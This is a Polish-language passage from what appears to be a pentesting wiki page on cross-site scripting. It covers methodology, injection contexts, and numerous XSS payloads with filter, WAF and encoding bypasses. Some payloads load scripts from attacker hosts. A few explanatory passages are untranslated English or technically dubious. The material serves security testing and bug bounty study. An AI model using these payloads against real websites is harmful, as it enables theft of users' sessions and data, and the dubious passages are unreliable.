# XSS (Cross Site Scripting)

/<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">

**Wskazówka dotycząca bug bounty**: **Zarejestruj się** na platformie **Intigriti**, premium platformie do bug bounty stworzonej przez hakerów dla hakerów! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Metodologia

1. Sprawdź, czy **jakakolwiek wartość, którą kontrolujesz** (_parametry_, _ścieżka_, _nagłówki_?, _ciasteczka_?) jest **odbijana** w HTML lub **używana** przez kod **JS**.
2. **Znajdź kontekst**, w którym jest odbijana/używana.
3. Jeśli jest **odbijana**
1. Sprawdź, **jakie symbole możesz użyć** i w zależności od tego przygotuj payload:
1. W **czystym HTML**:
1. Czy możesz tworzyć nowe tagi HTML?
2. Czy możesz używać zdarzeń lub atrybutów obsługujących protokół `javascript:`?
3. Czy możesz ominąć zabezpieczenia?
4. Czy zawartość HTML jest interpretowana przez jakąś klient-side'ową maszynę JS (_AngularJS_, _VueJS_, _Mavo_...), możesz wykorzystać [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Jeśli nie możesz tworzyć tagów HTML, które wykonują kod JS, czy możesz wykorzystać [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/)?
2. Wewnątrz **tagu HTML**:
1. Czy możesz wyjść do czystego kontekstu HTML?
2. Czy możesz tworzyć nowe zdarzenia/atrutyby, aby wykonać kod JS?
3. Czy atrybut, w którym jesteś uwięziony, obsługuje wykonanie JS?
4. Czy możesz ominąć zabezpieczenia?
3. Wewnątrz **kodu JavaScript**:
1. Czy możesz uniknąć tagu `<script>`?
2. Czy możesz uniknąć ciągu znaków i wykonać inny kod JS?
3. Czy twoje dane wejściowe są w szablonach literałów \`\`?
4. Czy możesz ominąć zabezpieczenia?
4. Wykonywana **funkcja** JavaScript
1. Możesz wskazać nazwę funkcji do wykonania, np.: `?callback=alert(1)`
4. Jeśli jest **używana**:
1. Możesz wykorzystać **DOM XSS**, zwróć uwagę, jak twoje dane wejściowe są kontrolowane i czy twoje **kontrolowane dane wejściowe są używane przez jakieś źródło**.

Pracując nad skomplikowanym XSS, może być przydatne wiedzieć o:

{% content-ref url="debugging-client-side-js.md" %}
[debugging-client-side-js.md](debugging-client-side-js.md)
{% endcontent-ref %}

## Odbijane wartości

Aby pomyślnie wykorzystać XSS, pierwszą rzeczą, którą musisz znaleźć, jest **wartość kontrolowana przez ciebie, która jest odbijana** na stronie internetowej.

* **Odbijane pośrednio**: Jeśli odkryjesz, że wartość parametru lub nawet ścieżki jest odbijana na stronie internetowej, możesz wykorzystać **Reflected XSS**.
* **Zapisane i odbijane**: Jeśli odkryjesz, że wartość kontrolowana przez ciebie jest zapisywana na serwerze i jest odbijana za każdym razem, gdy odwiedzasz stronę, możesz wykorzystać **Stored XSS**.
* **Uzyskane za pomocą JS**: Jeśli odkryjesz, że wartość kontrolowana przez ciebie jest uzyskiwana za pomocą JS, możesz wykorzystać **DOM XSS**.

## Konteksty

Próbując wykorzystać XSS, pierwszą rzeczą, którą musisz wiedzieć, to **gdzie jest odbijane twoje dane wejściowe**. W zależności od kontekstu będziesz mógł wykonać dowolny kod JS na różne sposoby.

### Czyste HTML

Jeśli twoje dane wejściowe są **odbijane w czystym HTML**, będziesz musiał wykorzystać jakiś **tag HTML**, aby wykonać kod JS: `<img , <iframe , <svg , <script` ... to tylko kilka z wielu możliwych tagów HTML, które możesz użyć.\
Pamiętaj również o [Client Side Template Injection](../client-side-template-injection-csti.md).

### Wewnątrz atrybutu tagu HTML

Jeśli twoje dane wejściowe są odbijane wewnątrz wartości atrybutu tagu, możesz spróbować:

1. **Wyjść z atrybutu i z tagu** (wtedy będziesz w czystym HTML) i utworzyć nowy tag HTML do wykorzystania: `"><img [...]`
2. Jeśli **możesz wyjść z atrybutu, ale nie z tagu** (`>` jest zakodowane lub usunięte), w zależności od tagu możesz **utworzyć zdarzenie**, które wykonuje kod JS: `" autofocus onfocus=alert(1) x="`
3. Jeśli **nie możesz wyjść z atrybutu** (`"` jest zakodowane lub usunięte), to w zależności od **którego atrybutu** twoje dane są odbijane, **jeśli kontrolujesz całą wartość lub tylko jej część**, będziesz mógł go wykorzystać. Na **przykład**, jeśli kontrolujesz zdarzenie takie jak `onclick=`, będziesz mógł sprawić, żeby wykonywało dowolny kod po kliknięciu. Innym interesującym **przykładem** jest atrybut `href`, gdzie możesz użyć protokołu `javascript:` do wykonania dowolnego kodu: **`href="javascript:alert(1)"`**
4. Jeśli twoje dane wejściowe są odbijane wewnątrz "**nieeksploatowalnych tagów**", możesz spróbować sztuczki z **`accesskey`**, aby wykorzystać podatność (będziesz potrzebować pewnego rodzaju inżynierii społecznej, aby to wykorzystać): **`" accesskey="x" onclick="alert(1)" x="`**

### Wewnątrz kodu JavaScript

W tym przypadku twoje dane wejściowe są odbijane między tagami **`<script> [...] </script>`** na stronie HTML, wewnątrz pliku `.js` lub w atrybucie za pomocą protokołu **`javascript:`**:

* Jeśli są odbijane między tagami **`<script> [...] </script>`**, nawet jeśli twoje dane wejściowe są wewnątrz jakiegoś rodzaju cudzysłowu, możesz spróbować wstrzyknąć `</script>` i wyjść z tego kontekstu. Działa to dlatego, że **przeglądarka najpierw analizuje tagi HTML**, a następnie zawartość, dlatego nie zauważy, że wstrzyknięty tag `</script>` znajduje się w kodzie HTML.
* Jeśli są odbijane **wewnątrz ciągu znaków JS** i poprzedni trik nie działa, będziesz musiał **wyjść** ze stringa, **wykonać** swój kod i **zrekonstruować** kod JS (jeśli wystąpi błąd, nie zostanie wykonany):
* `'-alert(1)-'`
* `';-alert(1)//`
* `\';alert(1)//`
* Jeśli twoje dane wejściowe są odbijane wewnątrz szablonów literałów, możesz **osadzać wyrażenia JS** za pomocą składni `${ ... }`: `` var greetings = `Hello, ${alert(1)}` ``
* **Kodowanie Unicode** działa, aby napisać **poprawny kod JavaScript**:
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
#### Hoisting w JavaScript

Hoisting w JavaScript odnosi się do możliwości **deklarowania funkcji, zmiennych lub klas po ich użyciu, dzięki czemu można wykorzystać sytuacje, w których XSS używa niezadeklarowanych zmiennych lub funkcji.**\
**Sprawdź następującą stronę, aby uzyskać więcej informacji:**

{% content-ref url="js-hoisting.md" %}
[js-hoisting.md](js-hoisting.md)
{% endcontent-ref %}

### Funkcja JavaScript

Wiele stron internetowych ma punkty końcowe, które **przyjmują jako parametr nazwę funkcji do wykonania**. Powszechnym przykładem, który można znaleźć w sieci, jest coś takiego jak: `?callback=callbackFunc`.

Dobrym sposobem, aby dowiedzieć się, czy coś podanego bezpośrednio przez użytkownika próbuje być wykonane, jest **zmodyfikowanie wartości parametru** (na przykład na 'Vulnerable') i sprawdzenie w konsoli błędów, tak jak na poniższym obrazku:

![](<../../.gitbook/assets/image (651) (2).png>)

Jeśli jest podatne, możesz **wywołać alert** wysyłając wartość: **`?callback=alert(1)`**. Jednakże, bardzo często te punkty końcowe będą **sprawdzać zawartość**, aby zezwolić tylko na litery, cyfry, kropki i podkreślenia (**`[\w\._]`**).

Jednakże, nawet przy tej ograniczonej możliwości, wciąż można wykonać pewne czynności. Wynika to z faktu, że można użyć tych prawidłowych znaków do **uzyskania dostępu do dowolnego elementu w DOM**:

![](<../../.gitbook/assets/image (662).png>)

Kilka przydatnych funkcji w tym celu:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Możesz również spróbować **wywołać funkcje JavaScript** bezpośrednio: `obj.sales.delOrders`.

Jednak zazwyczaj punkty końcowe wykonujące wskazaną funkcję są punktami końcowymi bez interesującego DOM, **inne strony w tej samej domenie** będą miały **bardziej interesujący DOM**, aby wykonać więcej działań.

Dlatego też, aby **wykorzystać tę podatność w innym DOM**, opracowano eksploatację **Same Origin Method Execution (SOME)**:

{% content-ref url="some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](some-same-origin-method-execution.md)
{% endcontent-ref %}

### DOM

Istnieje **kod JS**, który **niebezpiecznie** korzysta z pewnych danych kontrolowanych przez atakującego, takich jak `location.href`. Atakujący może wykorzystać to do wykonania dowolnego kodu JS.

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

### **Universalny XSS**

Tego rodzaju XSS można znaleźć **w dowolnym miejscu**. Nie zależą one tylko od wykorzystania klienta aplikacji internetowej, ale od **dowolnego** **kontekstu**. Tego rodzaju **wykonanie dowolnego kodu JavaScript** może nawet być wykorzystane do uzyskania **RCE**, **odczytu** **dowolnych** **plików** na klientach i serwerach, oraz wiele więcej.\
Kilka **przykładów**:

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-web/electron-desktop-apps/" %}
[electron-desktop-apps](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endcontent-ref %}

## Ominięcie WAF kodowanie obrazu

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](../../.gitbook/assets/eaubb2ex0aerank.jpg)

## Wstrzykiwanie w surowy HTML

Jeśli twoje dane wejściowe są odzwierciedlane **wewnątrz strony HTML** lub możesz uniknąć i wstrzyknąć kod HTML w tym kontekście, **pierwszą** rzeczą, którą musisz zrobić, to sprawdzić, czy możesz wykorzystać `<` do utworzenia nowych tagów: Po prostu spróbuj **odzwierciedlić** ten **znak** i sprawdź, czy jest on **kodowany HTML** lub **usuwany**, czy też jest **odzwierciedlany bez zmian**. **Tylko w ostatnim przypadku będziesz w stanie wykorzystać ten przypadek**.\
W tych przypadkach **pamiętaj również o** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Uwaga: Komentarz HTML można zamknąć za pomocą `-->` lub `--!>`**_

W tym przypadku, jeśli nie jest używane czarne/białe listowanie, możesz użyć payloadów takich jak:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>
```
Ale jeśli używane jest czarne/białe listowanie tagów/cech, będziesz musiał **przeprowadzić atak brute-force, aby dowiedzieć się, jakie tagi** możesz utworzyć.\
Gdy już **znajdziesz dozwolone tagi**, będziesz musiał **przeprowadzić atak brute-force na atrybuty/zdarzenia** w znalezionych poprawnych tagach, aby zobaczyć, jak możesz zaatakować kontekst.

### Atak brute-force na tagi/zdarzenia

Przejdź do [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) i kliknij na _**Skopiuj tagi do schowka**_. Następnie wyślij je wszystkie za pomocą narzędzia Burp Intruder i sprawdź, czy którykolwiek z tagów nie został uznany za złośliwy przez WAF. Gdy już odkryjesz, jakie tagi możesz użyć, możesz **przeprowadzić atak brute-force na wszystkie zdarzenia** za pomocą poprawnych tagów (na tej samej stronie internetowej kliknij na _**Skopiuj zdarzenia do schowka**_ i postępuj tak samo jak wcześniej).

### Własne tagi

Jeśli nie znalazłeś żadnego poprawnego tagu HTML, możesz spróbować **utworzyć własny tag** i wykonać kod JS za pomocą atrybutu `onfocus`. W żądaniu XSS musisz zakończyć adres URL znakiem `#`, aby strona **skupiła się na tym obiekcie** i **wykonała** kod:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Ominięcie czarnej listy

Jeśli jest używana jakaś forma czarnej listy, możesz spróbować ją obejść za pomocą kilku głupich sztuczek:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Bypass długości (małe XSSy)

{% hint style="info" %}
**Więcej małych XSSów dla różnych środowisk** payload [**można znaleźć tutaj**](https://github.com/terjanq/Tiny-XSS-Payloads) i [**tutaj**](https://tinyxss.terjanq.me).
{% endhint %}
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>
```
Ostatni z nich używa 2 znaków Unicode, które rozszerzają się do 5: telsr\
Więcej takich znaków można znaleźć [tutaj](https://www.unicode.org/charts/normalization/).\
Aby sprawdzić, w jakich znakach są rozkładane, sprawdź [tutaj](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

Jeśli w celu wykorzystania podatności potrzebujesz, aby **użytkownik kliknął link lub formularz** z wstępnie wypełnionymi danymi, możesz spróbować [**wykorzystać Clickjacking**](../clickjacking.md#xss-clickjacking) (jeśli strona jest podatna).

### Impossible - Dangling Markup

Jeśli uważasz, że **niemożliwe jest utworzenie znacznika HTML z atrybutem do wykonania kodu JS**, powinieneś sprawdzić [**Dangling Markup**](../dangling-markup-html-scriptless-injection/), ponieważ możesz **wykorzystać** podatność **bez** wykonania **kodu JS**.

## Wstrzykiwanie wewnątrz znacznika HTML

### Wewnątrz znacznika/ucieczka z wartości atrybutu

Jeśli jesteś **wewnątrz znacznika HTML**, pierwszą rzeczą, którą możesz spróbować, jest **ucieczka** ze znacznika i użycie jednej z technik wymienionych w [poprzedniej sekcji](./#injecting-inside-raw-html) do wykonania kodu JS.\
Jeśli **nie możesz uciec ze znacznika**, możesz utworzyć nowe atrybuty wewnątrz znacznika, aby spróbować wykonania kodu JS, na przykład używając pewnego ładunku, jak (_zauważ, że w tym przykładzie cudzysłowy są używane do ucieczki z atrybutu, nie będziesz ich potrzebować, jeśli twoje dane wejściowe są odzwierciedlane bezpośrednio wewnątrz znacznika_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Zdarzenia stylu**

Style events are a type of Cross-Site Scripting (XSS) attack that targets the style attribute of HTML elements. This type of attack allows an attacker to inject malicious code into a website, which is then executed by the victim's browser.

To perform a style event XSS attack, the attacker needs to find an input field or parameter that is reflected in the style attribute of an HTML element. This can be a text input, a URL parameter, or any other user-controllable input.

The attacker can then inject malicious code into the input field, taking advantage of the fact that the input is not properly sanitized or validated. This code is then reflected in the style attribute of the HTML element, and when the victim's browser renders the page, the code is executed.

The impact of a style event XSS attack can vary depending on the context in which it occurs. In some cases, it may allow an attacker to steal sensitive information, such as session cookies or login credentials. In other cases, it may be used to deface the website or redirect users to malicious websites.

To prevent style event XSS attacks, it is important to properly sanitize and validate all user-controllable input before it is reflected in the style attribute of HTML elements. This can be done by using a secure coding framework or library that automatically sanitizes input, or by implementing custom input validation and sanitization routines.

It is also recommended to use Content Security Policy (CSP) headers to restrict the types of content that can be loaded and executed on a website. This can help mitigate the impact of XSS attacks by preventing the execution of malicious code.

By understanding and mitigating the risks associated with style event XSS attacks, website owners and developers can help protect their users' sensitive information and maintain the integrity of their websites.
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Wewnątrz atrybutu

Nawet jeśli **nie możesz uciec z atrybutu** (`"` jest kodowane lub usuwane), w zależności od **którego atrybutu** wartość jest odzwierciedlana, jeśli kontrolujesz całą wartość lub tylko jej część, będziesz w stanie go nadużyć. Na **przykład**, jeśli kontrolujesz zdarzenie takie jak `onclick=`, będziesz mógł wykonać dowolny kod po kliknięciu.

Innym interesującym **przykładem** jest atrybut `href`, w którym można użyć protokołu `javascript:` do wykonania dowolnego kodu: **`href="javascript:alert(1)"`**

**Ominięcie wewnątrz zdarzenia za pomocą kodowania HTML/kodowania URL**

Zakodowane znaki **HTML wewnątrz wartości atrybutów tagów HTML są dekodowane w czasie wykonywania**. Dlatego coś takiego jak poniżej będzie ważne (payload jest wytłuszczone): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Zauważ, że **dowolny rodzaj kodowania HTML jest ważny**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Należy pamiętać, że kodowanie URL również będzie działać:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Omijanie zdarzenia wewnętrznego za pomocą kodowania Unicode**

W niektórych przypadkach, gdy filtracja zdarzeń wewnętrznych jest stosowana, można próbować obejść to zabezpieczenie, wykorzystując kodowanie Unicode. 

W przypadku, gdy filtracja zdarzeń wewnętrznych usuwa znaki specjalne, takie jak "<" i ">", można spróbować zakodować te znaki za pomocą ich odpowiedników Unicode. Na przykład, "<" może zostać zakodowane jako "\u003c", a ">" jako "\u003e". 

W ten sposób, jeśli filtracja usuwa znaki specjalne, ale nie rozpoznaje kodowania Unicode, można wprowadzić kod JavaScript, który zostanie wykonany w przeglądarce. 

Przykład:

```html
<input type="text" value="\u003cscript\u003ealert('XSS')\u003c/script\u003e">
```

W powyższym przykładzie, jeśli filtracja usuwa znaki "<" i ">", to wprowadzony kod JavaScript zostanie wykonany, wyświetlając alert z treścią "XSS".
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Specjalne protokoły w atrybucie

W niektórych miejscach można użyć protokołów **`javascript:`** lub **`data:`** do **wykonania dowolnego kodu JS**. Niektóre z nich będą wymagały interakcji użytkownika, a niektóre nie.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Miejsca, w których można wstrzyknąć te protokoły**

**Ogólnie** protokół `javascript:` można **używać w dowolnym znaczniku, który akceptuje atrybut `href`** oraz w **większości** znaczników, które akceptują atrybut `src` (ale nie `<img`)
```markup
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Inne sztuczki obfuskacji**

_**W tym przypadku kodowanie HTML i sztuczka z kodowaniem Unicode z poprzedniej sekcji są również ważne, ponieważ znajdujesz się w atrybucie.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Ponadto, istnieje jeszcze **fajny trik** dla tych przypadków: **Nawet jeśli Twój wpis wewnątrz `javascript:...` jest kodowany URL, zostanie on zdekodowany przed wykonaniem.** Więc jeśli musisz **uniknąć** z **łańcucha znaków** za pomocą **pojedynczego cudzysłowu** i widzisz, że jest **kodowany URL**, pamiętaj, że **to nie ma znaczenia,** zostanie **zinterpretowany** jako **pojedynczy cudzysłów** podczas **wykonywania**.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Zauważ, że jeśli spróbujesz **użyć jednocześnie** `URLencode + HTMLencode` w dowolnej kolejności, aby zakodować **payload**, to **nie zadziała**, ale możesz **mieszać je wewnątrz payloadu**.

**Używanie kodowania szesnastkowego i ósemkowego z `javascript:`**

Możesz użyć kodowania **szesnastkowego** i **ósemkowego** wewnątrz atrybutu `src` elementu `iframe` (przynajmniej) do deklarowania **tagów HTML do wykonania JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Odwrócone przechwytywanie karty

Reverse tab nabbing is an attack technique that takes advantage of the trust users have in their browser tabs. In this attack, the attacker tricks the user into clicking on a malicious link that opens a new tab. The attacker then uses JavaScript to modify the content of the original tab, making it appear as if the user is still on a trusted website.

This technique is particularly effective against websites that use single sign-on (SSO) authentication. When the user clicks on the malicious link and a new tab is opened, the attacker can use JavaScript to redirect the original tab to a phishing page that looks identical to the trusted website's login page. The user may not notice the change in the tab's URL or the slight differences in the page's appearance, and unknowingly enter their login credentials into the phishing page.

To protect against reverse tab nabbing, users should be cautious when clicking on links, especially those received from untrusted sources. It is also recommended to regularly update browsers and use browser extensions that block malicious scripts. Website owners can implement measures such as Content Security Policy (CSP) to mitigate the risk of this attack.
```javascript
<a target="_blank" rel="opener"
```
Jeśli możesz wstrzyknąć dowolny URL w dowolny znacznik **`<a href=`** zawierający atrybuty **`target="_blank"`** i **`rel="opener"`**, sprawdź **następującą stronę, aby wykorzystać to zachowanie**:

{% content-ref url="../reverse-tab-nabbing.md" %}
[reverse-tab-nabbing.md](../reverse-tab-nabbing.md)
{% endcontent-ref %}

### Bypassowanie obsługi zdarzeń

Po pierwsze, sprawdź tę stronę ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) w celu uzyskania przydatnych **"on" event handlers**.\
Jeśli istnieje czarna lista uniemożliwiająca tworzenie tych obsług zdarzeń, możesz spróbować następujących bypassów:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS w "Niewykorzystywalnych tagach" (ukryte pole wejściowe, link, kanoniczny, meta)

Z [**tutaj**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **teraz jest możliwe nadużycie ukrytych pól wejściowych za pomocą:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)>
```
A także w **meta tagach**:
```html
<!-- Injection inside meta attribute-->
<meta name="apple-mobile-web-app-title" content=""Twitter popover id="newsletter" onbeforetoggle=alert(2) />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Z [**tutaj**](https://portswigger.net/research/xss-in-hidden-input-fields): Możesz wykonać **XSS payload wewnątrz atrybutu ukrytego**, pod warunkiem, że **przekonasz** **ofiarę** do naciśnięcia **kombinacji klawiszy**. W przeglądarce Firefox na systemach Windows/Linux kombinacja klawiszy to **ALT+SHIFT+X**, a na systemie OS X to **CTRL+ALT+X**. Możesz określić inną kombinację klawiszy, używając innego klawisza w atrybucie access key. Oto wektor:
```markup
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**Payload XSS będzie wyglądać tak: `" accesskey="x" onclick="alert(1)" x="`**

### Ominięcie czarnej listy

W tej sekcji już przedstawiono kilka sztuczek z użyciem różnych kodowań. Wróć, aby dowiedzieć się, gdzie możesz zastosować:

* **Kodowanie HTML (tagi HTML)**
* **Kodowanie Unicode (może być poprawnym kodem JS):** `\u0061lert(1)`
* **Kodowanie URL**
* **Kodowanie szesnastkowe i ósemkowe**
* **Kodowanie danych**

**Ominięcie dla tagów HTML i atrybutów**

Przeczytaj [Ominięcie czarnej listy z poprzedniej sekcji](./#ominięcie-czarnej-listy).

**Ominięcie dla kodu JavaScript**

Przeczytaj [Omijanie czarnej listy JavaScript z następnej sekcji](./#omijanie-czarnej-listy-javascript-techniki).

### CSS-Gadżety

Jeśli znalazłeś **XSS w bardzo małej części** strony, która wymaga pewnego rodzaju interakcji (może to być mały link w stopce z elementem onmouseover), możesz spróbować **zmodyfikować przestrzeń, którą zajmuje ten element**, aby zwiększyć prawdopodobieństwo uruchomienia linku.

Na przykład, możesz dodać pewne style do elementu, takie jak: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Jeśli jednak WAF filtrowanie atrybutu style, możesz użyć Gadżetów CSS, więc jeśli znajdziesz na przykład

> .test {display:block; color: blue; width: 100%\}

i

> \#someid {top: 0; font-family: Tahoma;}

Teraz możesz zmodyfikować nasz link i przekształcić go w formę

> \<a href="" id=someid class=test onclick=alert() a="">

Ten trik został zaczerpnięty z [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Wstrzykiwanie kodu wewnątrz kodu JavaScript

W tym przypadku **wprowadzane przez Ciebie dane** będą **odzwierciedlane wewnątrz kodu JS** pliku `.js` lub między znacznikami `<script>...</script>` lub między zdarzeniami HTML, które mogą wykonywać kod JS lub między atrybutami, które akceptują protokół `javascript:`.

### Unikanie znacznika \<script>

Jeśli Twój kod jest wstawiany wewnątrz `<script> [...] var input = 'reflected data' [...] </script>`, możesz łatwo **uniknąć zamknięcia znacznika `<script>`**:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Zauważ, że w tym przykładzie **nawet nie zamknęliśmy pojedynczego cudzysłowu**. Dzieje się tak, ponieważ **przeglądarka najpierw wykonuje analizę składni HTML**, która polega na identyfikacji elementów strony, w tym bloków skryptów. Analiza skryptów JavaScript w celu zrozumienia i wykonania osadzonych skryptów jest przeprowadzana dopiero później.

### Wewnątrz kodu JS

